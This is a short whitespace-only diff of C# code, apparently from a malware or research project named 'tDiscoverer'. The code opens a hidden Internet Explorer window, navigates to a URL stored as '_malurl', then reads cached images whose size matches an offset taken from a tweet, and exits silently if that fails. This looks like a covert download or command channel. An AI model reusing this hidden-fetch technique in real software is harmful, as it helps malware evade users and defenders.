@@ -191,17 +191,16 @@ namespace tDiscoverer
 			SHDocVw.IWebBrowserApp wb = (SHDocVw.IWebBrowserApp)ie;
 			//set IE windows not visible
 			wb.Visible = false;
-
+		
 			object noValue = System.Reflection.Missing.Value;
 			wb.Navigate(_malurl, ref noValue, ref noValue, ref noValue, ref noValue);
-
-			// Get access to its document.
+		
 			while (wb.Busy) { Thread.Sleep(1000); }
 			ie.Quit();
 			Console.WriteLine("MAKE HTTP GET REQUEST: STOP");
 			Console.ReadLine();
 			#endregion
-
+		
 			#region Get images and select by filesize
 			/**
 			* Get images from IE cache  at least as large as the offset specified in the tweet
@@ -229,7 +228,7 @@ namespace tDiscoverer
 				// if process fail than exit without signal
 				catch (IOException) { Environment.Exit(0); }
 			}
-
+		
 			Console.WriteLine("GET IMAGE FROM IE CACHE: STOP");
 			Console.ReadLine();
 			#endregion
